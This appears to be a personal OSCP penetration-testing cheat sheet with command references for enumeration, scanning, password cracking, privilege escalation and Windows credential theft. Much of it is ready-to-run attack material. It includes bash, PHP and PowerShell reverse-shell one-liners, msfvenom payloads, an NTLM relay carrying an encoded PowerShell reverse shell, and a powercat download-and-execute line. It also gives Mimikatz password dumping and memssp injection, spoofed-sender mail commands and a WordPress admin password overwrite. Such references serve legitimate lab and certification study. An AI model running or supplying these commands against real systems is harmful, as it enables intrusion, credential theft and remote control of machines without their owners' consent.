### General OSCP

#### VPN

Connect to OffSec labs

```sh
sudo openvpn /home/kali/Documents/offsec/universal.ovpn 
```

#### SSH tip

The `UserKnownHostsFile=/dev/null` and `StrictHostKeyChecking=no` options have been added to prevent the known-hosts file on our local Kali machine from being corrupted.

```sh
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" USER@IP
```

#### RDP

```sh
xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
```

### Protocols

#### SSH (TCP: 22)

```sh
# Connect with specific SSH key only, without trying additional keys available on the system
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o 'IdentitiesOnly=yes' -i /path/to/key USER@IP
```

#### SMTP (TCP: 25)

[https://hackviser.com/tactics/pentesting/services/smtp#connect](https://hackviser.com/tactics/pentesting/services/smtp#connect) 

##### Netcat
Connect to SMTP server via netcat and verify users/email addresses:

```sh
nc -nv IP 25
VRFY root
VRFY idontexist
```

##### PowerShell

```ps1
Test-NetConnection -Port 25 IP
# Telnet (install)
dism /online /Enable-Feature /FeatureName:TelnetClient
telnet IP 25
```

##### Nmap

``` sh
sudo nmap -p 25,587 --script smtp-* target.com
```

##### smtp-user-enum

``` sh
# SMTP user enumeration via VRFY, EXPN and RCPT with clever timeout, retry and reconnect functional
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M VRFY -t IP
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M RCPT -t IP
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -M EXPN -t IP
```

##### Swaks

```sh
# Basic SMTP connectivity test
swaks --to user@target.com --server target.com

# Specify SMTP port
swaks --to user@target.com --server target.com --port 25
swaks --to user@target.com --server target.com --port 587
swaks --to user@target.com --server target.com --port 465 --tls-on-connect

# Enumerate users via RCPT TO
swaks --to test@target.com --server target.com --quit-after RCPT

# Manual MAIL FROM / RCPT TO control
swaks --server target.com --mail-from attacker@evil.com --to victim@target.com

# Test SMTP AUTH (LOGIN)
swaks --to user@target.com --server target.com --auth LOGIN --auth-user user --auth-password pass

# Test SMTP AUTH (PLAIN)
swaks --to user@target.com --server target.com --auth PLAIN --auth-user user --auth-password pass

# Spoof sender address
swaks --to victim@target.com --from ceo@target.com --server target.com

# Custom email body
swaks --to victim@target.com --from attacker@evil.com --server target.com --data "Subject: Test\n\nBody text"

# Attach local file (also try with @ in front of filename)
swaks --to victim@target.com --server target.com --attach file.txt
swaks --to victim@target.com --server target.com --attach @file.txt

# Suppress data send (banner / capability recon)
swaks --server target.com --quit-after EHLO

# Test open relay
swaks --to victim@external.com --from spoof@external.com --server target.com

# Timeout control (avoid hanging)
swaks --to user@target.com --server target.com --timeout 5

```

#### WHOIS (TCP: 43)

```sh
whois DOMAIN
whois IP
```

#### DNS (TCP: 53)

##### Lookup

```sh
# Linux
host DOMAIN
host -t txt DOMAIN
# Windows
nslookup DOMAIN
nslookup -type=TXT DOMAIN IP
```

##### Zone transfer

```sh
# Attempt a Zone Transfer manually 
host -l DOMAIN ns1.DOMAIN
# Automated Zone Transfer check with DNSRecon
dnsrecon -d DOMAIN -t axfr
# Find SRV records (often points to AD Domain Controllers/SIP/LDAP)
host -t SRV _ldap._tcp.DOMAIN
```

#### HTTP(S) (TCP: 80, 443)

##### Enumeration

```sh
http://domain/robots.txt
http://domain/sitemap.xml
CTRL+U (page source)
Wappalyzer
DevTools Debugger
```

##### Interaction with CLI clients

Different methods to connect to HTTP(S) services via CLI.

```sh
curl --path-as-is -vv -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'
curl --data-urlencode
wget
httpx <URL> --download file.txt
```

##### Directories

###### Gobuster

```sh
gobuster dir -u IP -w /usr/share/wordlists/dirb/small.txt -t 10
```

###### Feroxbuster

```sh
feroxbuster -u http://target.com

# Scan with custom wordlist and extensions (PHP/ASP/JS common for OSCP)
feroxbuster -u http://target.com -w wordlist.txt -x php,asp,aspx,js,txt,pdf
```

##### Subdomains

###### Manual

```sh
# Look for subdomains using wordlist
for ip in $(cat list.txt); do host $ip.DOMAIN; done
# Look for subdomains using PTR records (reverse DNS)
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

###### DNSRecon

```sh
# Standard scan
dnsrecon -d DOMAIN -t std
# Brute force with wordlist
dnsrecon -d DOMAIN -D ~/list.txt -t brt
```

###### DNSEnum

```sh
dnsenum DOMAIN
```

###### Gobuster

Can create tailored wordlist using LLM or use SecLists.

```sh
gobuster dns -d DOMAIN -w wordlist.txt -t 10
```

###### CRT.sh

[crt.sh](https://crt.sh)

#### SMB (TCP: 139, 445)

##### PowerShell

```sh
net view \\dc01 /all
```

##### Nmap

```sh
# SMB + NetBIOS
sudo nmap -v -p 139,445 IP
sudo nmap -v -p 139,445 --script smb-os-discovery IP
# Enumeration scripts
sudo nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-security-mode IP

```

##### nbtscan

Query the NetBIOS name service for valid NetBIOS names, specifying the originating UDP port as 137 with the -r option. NetBIOS names are often very descriptive about the role of the host within the organization.

```sh
sudo nbtscan -r IP/24
```

##### enum4linux

```sh
enum4linux -a IP
```

##### smbmap

```sh
# Enumerate shares
smbmap -H IP
```

##### smbclient

```sh
# List available SMB shares anonymously
smbclient -L 10.0.0.5 -N

# List shares with credentials
smbclient -L 10.0.0.5 -U user%password

# Connect to a share anonymously
smbclient //10.0.0.5/public -N

# Connect to a share with credentials
smbclient //10.0.0.5/share -U user%password

# Connect using a domain-qualified user
smbclient //10.0.0.5/share -U DOMAIN\\user%password

# Specify SMB version (common in CTFs)
smbclient //10.0.0.5/share -U user%password -m SMB2

# Non-interactive directory listing
smbclient //10.0.0.5/share -U user%password -c "ls"

# Download a single file
smbclient //10.0.0.5/share -U user%password -c "get flag.txt"

# Recursively download all files
smbclient //10.0.0.5/share -U user%password -c "recurse; prompt off; mget *"

# Upload a file
smbclient //10.0.0.5/share -U user%password -c "put shell.php"

# Check write permissions quickly
smbclient //10.0.0.5/share -U user%password -c "mkdir testdir"

# Use a credentials file
smbclient //10.0.0.5/share -A creds.txt

# Null session check against IPC$
smbclient //10.0.0.5/IPC$ -N

# Pass NTLM hash
smbclient \\\\192.168.50.212\\secrets -U USER --pw-nt-hash HASH

# Download all files in SMB share
mask ""
recurse ON
prompt OFF
mget *
```

##### Impacket

```sh
# Obtain interactive shell via SMB share using PsExec by passing hash (system privs) 
impacket-psexec -hashes 00000000000000000000000000000000:HASH USER@IP

# Obtain interactive shell via SMB share using WmiExec by passing hash (administrator privs)
impacket-wmiexec -hashes 00000000000000000000000000000000:HASH USER@IP

# Relay Net-NTLMv2 hash (no HTTP server, support SMB2), replace PS base64 content, open listener for reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t IP -c "powershell -enc PS_REVSHELL_ONELINER_BASE64"
nc -nvlp 8080
# Open bind shell and run SMB connection to Kali (example)
nc IP PORT
dir \\KALI_IP\test
```

##### Responder

[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

```sh
# Receive and crack Net-NTLMv2 hash from target using Responder
# Display adapters
ip a
# Run Responder on adapter
sudo responder -I tap0
# From target machine, run simple dir listing to Responder
dir \\IP\test
# Crack captured Net-NTLMv2 hash with hashcat
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

#### SNMP (UDP: 161)

##### Nmap

```sh
# Scan for open ports
sudo nmap -sU --open -p IP -oG open-snmp.txt
```

##### onesixtyone

SNMP brute force scanner.

```sh
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.0.$ip; done > ips
onesixtyone -c community -i ips
```

##### snmpwalk

```sh
# With hex decode, timeout 10 sec
snmpwalk -c public -v1 -t 10 IP -Oa

# Enumerate Windows users on dc
snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25

# Enumerate running processes
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
sudo nmap -sU -p 161 --script=snmp-processes <target>

# Enumerate installed software
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2

# Enumerate TCP listening ports
snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
```

#### Databases (TCP: 3306 (MySQL))

##### MySQL

```sh
# MySQL login
mysql -u USER -p'PASS' -h IP -P PORT --skip-ssl-verify-server-cert

# Check version
select version();
# Current user
select system_user();
# List DBs
show databases;
# List tables in DB
show tables from DBNAME;
```

##### MSSQL

```sh
# MSSQL login
impacket-mssqlclient USER:PASS@IP -windows-auth

# Check version
SELECT @@version;
# List DBs. Defaults are: master, tempdb, model, and msdb
SELECT name FROM sys.databases;
# List tables in DB
SELECT * FROM offsec.information_schema.tables;
```

### Scanning (ports / vulns)

#### Netcat

```sh
# Netcat TCP ports 3388-3390, 1 second timeout, zero I/O (data)
nc -nvv -w 1 -z IP 3388-3390
# Netcat UDP ports 120-123, 1 second timeout, zero I/O (data)
nc -nv -u -z -w 1 IP 120-123
```

#### Nikto

HTTP(S) only.

```sh
nikto -h http://target.com
```

#### Nmap

```sh
# Scan all TCP ports, stealth and fast (no ACK)
sudo nmap -sU -sS -vv IP
# Discovery scan, greppable format
nmap -v -sn IP -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2
# TCP scan, top 20 ports, with OS version detection, script scanning, and traceroute
nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
# OS fingerprinting (guess)
sudo nmap -O IP --osscan-guess
# Vulnerability scan
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
```

#### Nuclei

```sh
nuclei -target https://example.com
```

#### PowerShell

```ps1
# PowerShell scanning (living off the land)
Test-NetConnection -Port 445 IP
# PowerShell scan first 1024 ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
```

### Exploitation

#### Exploits

##### SearchSploit

[Exploit-DB](https://www.exploit-db.com/)

```sh
sudo apt update && sudo apt install exploitdb

# Search terms
searchsploit afd windows local
# Show complete path
searchsploit -p 39446
# Exclude
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
# Strict
searchsploit -s Apache Struts 2.0.0
# JSON output
searchsploit -j 55555 | json_pp
# Download
searchsploit -m windows/remote/48537.py
searchsploit -m 42031
```

#### Command Injection

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

#### SQL Injection

##### Payloads

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) 

##### sqlmap

```sh
# sqlmap
sqlmap -u http://IP/index.php?user=1 -p user
# sqlmap with saved POST request
sqlmap -r post.txt -p user 
# sqlmap with dump
sqlmap -u http://IP/index.php?user=1 -p user --dump
# sqlmap with shell
sqlmap -u http://IP/index.php?user=1 -p user --os-shell
```

#### Password Attacks

##### Brute Force

[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

[https://weakpass.com/](https://weakpass.com/)

[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

[https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables](https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables)

###### Wordlists

```sh
# Kali lists
# Passwords
/usr/share/wordlists/rockyou.txt
# Usernames
/usr/share/wordlists/dirb/others/names.txt 

# Generate wordlist with min/max 6 characters (lab***)
crunch 6 6 -t lab%%% > wordlist
```

###### Hydra

```sh
# Attempt single user name with password list
hydra -l USER -P PASSLIST -s PORT PROTO://IP
# Attempt login on HTTP POST form
hydra -l USER -P PASSLIST IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# HTTP get (basic auth)
hydra -L USERLIST -P PASSLIST IP http-get /path/to/login
# HTTP basic auth, no 10s wait, verbose, failure=401
hydra -I -V -l USER -P PASSLIST "http-get://IP/webdav:A=BASIC:F=401"
# RDP single task (throttled to limit errors)
hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
# SSH
hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
```

###### JohnTheRipper

``` sh
# Run with ruleset
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# Convert SSH hash
ssh2john id_rsa > ssh.hash 
```

##### Cracking

[https://hashcat.net/hashcat/](https://hashcat.net/hashcat/) (mainly GPU, also support CPU)

[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) (hash modes and example hashes)

[https://hashcat.net/wiki/doku.php?id=rule\_based\_attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) (rule functions)

[https://www.openwall.com/john/](https://www.openwall.com/john/) (mainly CPU, also supports GPU)

###### Hashcat

```sh
# Check hash modes available
hashcat -h | grep -i "ssh"
# Benchmark mode
hashcat -b
# Brute force MD5
hashcat -m 0
# Use rules, debug mode 
hashcat -r demo.rule --stdout wordlist.txt
# Rule to append !, 1, and capitalize first letter en lowercase the rest
$! $1 c
# Included rules
ls -la /usr/share/hashcat/rules/
# Crack MD5 with ruleset
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r rules.rule

# Identify hash type
hash-identifier
hashid

# KeePass example
# Find KeePass database file (Windows)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Convert KeePass database file to hash (remove filename in file)
keepass2john Database.kdbx > keepass.hash
cat keepass.hash   
	$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
# Crack password
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# NTLM
# Get local users
Get-LocalUser
# Run Mimikatz in elevated PowerShell window
.\mimikatz.exe
# Enable SeDebugPrivilege for needed debug privs
privilege::debug
# Elevate to SYSTEM privs
token::elevate
# Option 1 (local user): extract NThashes from SAM
lsadump::sam
# Option 2 (domain user): extract NThashes from LSASS
sekurlsa::logonpasswords
# Crack NThash with Hashcat, with best66 rules
hashcat -m 1000 HASHFILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

### Privilege Escalation

[HackTricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) 
[compendium by g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
[PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)

#### Enumeration

```sh
# Basics
id
whoami
hostname
uname -a
arch
cat /etc/os-release
groups
env
set
ps aux | cat
# Enumerate packages and kernel modules for vulnerabilities
dpkg -l
lsmod
/sbin/modinfo <BINARY>
# Enumerate network configuration
ip a
route
routel
netstat -tulnp
ls -la /home
# Enumerate users
cat /etc/passwd
cat /etc/shadow
# Enumerate cronjobs
cat /etc/crontab
crontab -l
sudo crontab -l
ls -la /etc/cron*
grep -i "CRON" /var/log/syslog
# Display processes running in Linux with pspy
# https://github.com/dominicbreuker/pspy
# Look for cmdline processes
cat /proc/self/cmdline 
# Check SSH config
# Check for: PermitRootLogin yes
# Check for: (#)PasswordAuthentication yes
cat /etc/ssh/sshd_config
# SUID / GUID
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
# Find all writable files/folders
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
find / -writable -type d 2>/dev/null
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
# Look for commands in sudoers file
sudo -l
# Check sudo version
sudo -V
# Pivot to other user
su USER
# Check capabilities
# https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
getcap -r / 2>/dev/null
# Check services
systemctl list-units
systemctl status SERVICE
/etc/systemd/system/SERVICE.service
# Find sensitive files (examples)
grep -r "password" / 2>/dev/null
grep -r "pass" /home 2>/dev/null
grep -r "key" /opt 2>/dev/null
# Find mounted drives
mount
cat /etc/fstab
# Find available disks for mounting
lsblk
# Files in temporary directories
ls -la /tmp
ls -la /var/tmp
ls -la /dev/shm

# Run Linpeas
python3 -m http.server 80
wget http://LOCALIP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

#### SUID/GUID

Find binaries with SUID/GUID bit set. Use [GTFOBins](https://gtfobins.org/) to further exploit. Note that some binaries need to be run with `sudo` and therefore require the password of the local user.

``` sh
# SUID
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
# GUID
find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
```

### Reverse Shells

[https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary)

[https://www.revshells.com/](https://www.revshells.com/)

```sh
# Check current shell
ps -p $$

# Kali directory webshells
/usr/share/webshells/

# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1
# Bash (URL encoded)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
# Bash, in case of sh
bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'
# Powershell one liner
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 
# in base of Base64, make sure to encode as UTF16 first
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Python file hosting
python3 -m http.server 80

# Create payloads with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > reverse.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell
```

#### Listeners

``` sh
# Netcat listener
nc -nvlp 4444

# Meterpreter listener
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"

# Powercat listener script (Kali) and command to execute
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
IEX (New-Object System.Net.Webclient).DownloadString("http://IP/powercat.ps1");powercat -c IP -p PORT -e powershell 
```

#### Upgrade shell

``` sh
# Upgrade shell with Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Fix on local side to make proper TTY
Ctrl + Z
stty raw -echo; fg
Enter
```

### Windows Authentication

#### Mimikatz

```sh
# Run Mimikatz in elevated PowerShell window
.\mimikatz.exe

# Enable SeDebugPrivilege for needed debug privs
privilege::debug

# Elevate to SYSTEM privs
token::elevate

# Dump passwords
# Option 1 (local user): extract NThashes from SAM
lsadump::sam
# Option 2 (domain user): extract NThashes from LSASS
sekurlsa::logonpasswords

# Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds
misc::memssp
# Check output after auth request happened
type C:\Windows\System32\mimilsa.log
```

### Misc.

```sh
# Folders/files to look in
/var/www/html/ 
/etc/passwd
/etc/shadow
/proc/self/environ
/var/www/html/webdav/passwd.dav

# SSH key handling
../.ssh/id_rsa
chmod 400 id_rsa
sudo -l



# Directory traversal Windows
C:\Windows\System32\drivers\etc\hosts
# IIS web server files/folders
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
# XAMPP PHP
C:\xampp\apache\logs

# Decode Base64
echo <base64> | base64 -d
# Inspect file in binary
xxd -b malware.txt

# Test whether running in CMD or PS
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# Exiftool, display duplicated and unknown tags
exiftool -a -u document.pdf

# Quickly scan files for content
find . -type f -name "FILENAME_HINT" -exec grep -niH "TERM" {} +

# Python2 env
sudo apt install virtualenv python2 python2-dev
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python2 get-pip.py  
pip2 install virtualenv      
python2 -m virtualenv py2env  
source py2env/bin/activate
python -V
# Install impacket for Pyhon2
pip install impacket==0.9.22

# Open webdav folder, for example to host malicious .lnk file
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav

# Proxy Python through Burp
# https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("https://www.google.com/", proxies=proxies, verify=False)

# Small sample files for uploads
https://github.com/mathiasbynens/small

# File upload, collect file elsewhere (UNC path) by changing filename in Burp, e.g. to capture stuff in Responder
\\\\IP\\test

# Wordpress
# https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
wpscan --url http://IP -v  
# Replace admin password in database
mysql -u USER --password=PASS -h localhost -e "use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"


```

### Kali Setup

Python2 virtual environment

.txt file to copy often needed commands from

Cross compilation mingw-w64 wine 

\+ sudo dpkg --add-architecture i386 && apt-get update &&  
apt-get install wine32

Default CTF folder structure

Bookmarks

[https://explainshell.com/](https://explainshell.com/)

Trillium

VScode

Other resources

Macro/alias for 192.168.

Flameshot

Download seclists

Burp plugin and cert

Copy /usr/share/shells to Downloads for easy access and backup

```sh
cd /usr/share/wordlists/
sudo gzip -d rockyou.txt.gz
```